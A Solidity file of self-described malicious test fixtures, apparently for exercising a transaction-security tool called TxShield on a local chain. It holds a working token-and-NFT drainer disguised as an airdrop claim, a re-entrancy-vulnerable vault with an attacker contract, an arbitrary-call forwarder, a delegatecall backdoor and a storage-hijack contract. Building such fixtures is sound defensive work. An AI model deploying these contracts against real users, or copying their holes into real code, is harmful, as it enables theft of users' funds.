// SPDX-License-Identifier: Apache-2.0
pragma solidity 0.8.24;

// MALICIOUS TEST FIXTURES. These reproduce common attack shapes so TxShield's
// simulation and rules can be tested against real execution on a local
// Anvil chain. Do not deploy anywhere else.

interface IERC20Like {
    function balanceOf(address) external view returns (uint256);
    function allowance(address, address) external view returns (uint256);
    function transferFrom(address, address, uint256) external returns (bool);
}

interface IERC721Like {
    function isApprovedForAll(address, address) external view returns (bool);
    function transferFrom(address, address, uint256) external;
}

/// @notice Fake "claim your airdrop" contract. claim() is payable, keeps the
/// ETH, and sweeps every token the caller has approved to it.
contract Drainer {
    address public immutable attacker;
    address[] public tokens;
    address public nft;
    uint256[] public nftIds;

    constructor(address attacker_, address[] memory tokens_, address nft_, uint256[] memory nftIds_) {
        attacker = attacker_;
        tokens = tokens_;
        nft = nft_;
        nftIds = nftIds_;
    }

    function claim() external payable {
        for (uint256 i = 0; i < tokens.length; i++) {
            IERC20Like t = IERC20Like(tokens[i]);
            uint256 bal = t.balanceOf(msg.sender);
            uint256 allowed = t.allowance(msg.sender, address(this));
            uint256 amount = bal < allowed ? bal : allowed;
            if (amount > 0) {
                t.transferFrom(msg.sender, attacker, amount);
            }
        }
        if (nft != address(0) && IERC721Like(nft).isApprovedForAll(msg.sender, address(this))) {
            for (uint256 i = 0; i < nftIds.length; i++) {
                IERC721Like(nft).transferFrom(msg.sender, attacker, nftIds[i]);
            }
        }
        if (msg.value > 0) {
            (bool ok,) = attacker.call{value: msg.value}("");
            require(ok, "forward failed");
        }
    }
}

/// @notice Arbitrary-call executor: performs any call it is given. If users
/// approved it, anyone can use it to move their tokens.
contract Forwarder {
    function execute(address target, bytes calldata data) external payable returns (bytes memory) {
        (bool ok, bytes memory out) = target.call{value: msg.value}(data);
        require(ok, "call failed");
        return out;
    }
}

/// @notice Vault with the classic re-entrancy bug (sends before updating).
contract ReentrantVault {
    mapping(address => uint256) public deposits;

    function deposit() external payable {
        deposits[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amount = deposits[msg.sender];
        require(amount > 0, "nothing to withdraw");
        (bool ok,) = msg.sender.call{value: amount}("");
        require(ok, "send failed");
        deposits[msg.sender] = 0;
    }
}

/// @notice Exploits ReentrantVault by re-entering withdraw() from receive().
contract VaultAttacker {
    ReentrantVault public immutable vault;
    uint256 public reentries;

    constructor(ReentrantVault vault_) {
        vault = vault_;
    }

    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        if (reentries < 2 && address(vault).balance >= msg.value) {
            reentries++;
            vault.withdraw();
        }
    }
}

/// @notice Contract whose functions revert in different ways.
contract Reverter {
    error Unauthorized(address caller);

    function swap(uint256 deadline) external view returns (uint256) {
        require(block.timestamp <= deadline, "EXPIRED");
        return 1;
    }

    function overflow(uint256 x) external pure returns (uint256) {
        return x + type(uint256).max;
    }

    function guarded() external view {
        revert Unauthorized(msg.sender);
    }
}

/// @notice Contract that delegatecalls arbitrary targets (a backdoor shape).
contract DelegateExecutor {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function run(address target, bytes calldata data) external {
        (bool ok,) = target.delegatecall(data);
        require(ok, "delegatecall failed");
    }
}

/// @notice Library-style code that takes over storage slot 0 when
/// delegatecalled.
contract OwnerHijack {
    address public owner;

    function hijack(address newOwner) external {
        owner = newOwner;
    }
}
